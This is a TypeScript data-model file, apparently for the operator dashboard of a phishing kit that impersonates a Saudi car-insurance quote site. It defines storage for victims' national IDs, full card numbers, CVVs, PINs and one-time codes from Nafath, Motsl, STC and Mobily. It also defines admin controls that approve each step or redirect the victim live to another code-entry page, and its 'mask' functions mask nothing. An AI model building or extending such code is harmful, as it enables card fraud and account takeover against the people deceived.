// Data model mirrors the fields actually collected by the public insurance site
// (tmin-becaer.bolt.host): Arabic KSA car-insurance flow with quote → insurer
// selection → payment → OTP verification steps (Motsl / Nafath / STC / Mobily).

export type PageKey =
  | "quote_landing"
  | "insurer_selected"
  | "payment_card"
  | "card_otp"
  | "card_pin"
  | "phone_entry"
  | "motsl_otp"
  | "nafath"
  | "stc_awaiting";

export const PAGES: { key: PageKey; label: string }[] = [
  { key: "quote_landing", label: "Quote / Landing" },
  { key: "insurer_selected", label: "Insurer selected" },
  { key: "payment_card", label: "Payment / Card" },
  { key: "card_otp", label: "Card OTP" },
  { key: "card_pin", label: "Card PIN" },
  { key: "phone_entry", label: "Phone entry" },
  { key: "motsl_otp", label: "Motsl OTP" },
  { key: "nafath", label: "Nafath" },
  { key: "stc_awaiting", label: "STC awaiting" },
];

export function pageLabel(key: PageKey) {
  return PAGES.find((p) => p.key === key)?.label ?? key;
}

export type SessionState = "live" | "blocked" | "completed";

export interface Submission {
  cardNumber?: string;
  cvv?: string;
  expiry?: string;
  cardOtp?: string;
  pin?: string;
  motslPhone?: string;
  motslOtp?: string;
  nafathOtp?: string;
  stcOtp?: string;
  mobilyOtp?: string;
  phoneOtp?: string;
}

export interface QuoteSession {
  sessionId: string; // short hex like "6e51fc48"
  nationalId: string;
  phone: string;
  serialNumber: string; // vehicle serial / sequence number
  vehicleMake: string;
  vehicleModel: string;
  modelYear: number;
  declaredValue: number; // SAR
  insurerCompany: string;
  insurerOfferSar: number;
  currentPage: PageKey;
  state: SessionState;
  createdAt: string;
  updatedAt: string;
  submission: Submission;
  ipAddress?: string;
  country?: string;
  awaitingApproval?: boolean;
  requestedPage?: string;
}

export const KSA_INSURERS = [
  "التعاونية",
  "سلامة للتأمين",
  "تكافل الراجحي",
  "ولاء للتأمين التعاوني",
  "اليانز للتأمين",
  "الخليجية العامة للتأمين",
  "ميدغلف السعودية",
  "الدرع العربي",
];

export function maskNationalId(v: string) {
  return v ?? "";
}

export function maskPhone(v: string) {
  return v ?? "";
}

export function maskCard(v?: string) {
  return v ?? null;
}


export function formatSar(n: number) {
  return `${new Intl.NumberFormat("en-US").format(n)} SAR`;
}

// Dashboard is operated from Amman (UTC+3, no DST). Render times in that
// fixed offset so SSR and client always agree regardless of the viewer's TZ.
export function formatDateTime(iso: string) {
  const d = new Date(iso);
  const shifted = new Date(d.getTime() + 3 * 60 * 60_000);
  const pad = (n: number) => String(n).padStart(2, "0");
  const h24 = shifted.getUTCHours();
  const h12 = h24 % 12 === 0 ? 12 : h24 % 12;
  const ampm = h24 < 12 ? "AM" : "PM";
  return `${shifted.getUTCFullYear()}-${pad(shifted.getUTCMonth() + 1)}-${pad(shifted.getUTCDate())} ${pad(h12)}:${pad(shifted.getUTCMinutes())} ${ampm}`;
}

const mins = (m: number) => new Date(Date.now() - m * 60_000).toISOString();

export const SEED_SESSIONS: QuoteSession[] = [];

// Step actions the admin can approve or decline for the currently visible step.
export const STEP_ACTIONS = [
  "Card / Payment",
  "Card OTP",
  "Phone",
  "Phone OTP",
  "Mobily OTP",
  "STC OTP",
  "Motsl OTP",
  "Nafath",
  "Service",
] as const;
export type StepAction = (typeof STEP_ACTIONS)[number];

// Pages the admin can redirect the customer to.
export const REDIRECT_TARGETS: { key: PageKey; label: string }[] = [
  { key: "phone_entry", label: "Phone entry" },
  { key: "motsl_otp", label: "Motsl OTP" },
  { key: "nafath", label: "Nafath" },
  { key: "card_otp", label: "Card OTP" },
  { key: "card_pin", label: "Card PIN" },
  { key: "payment_card", label: "Payment / Card" },
];
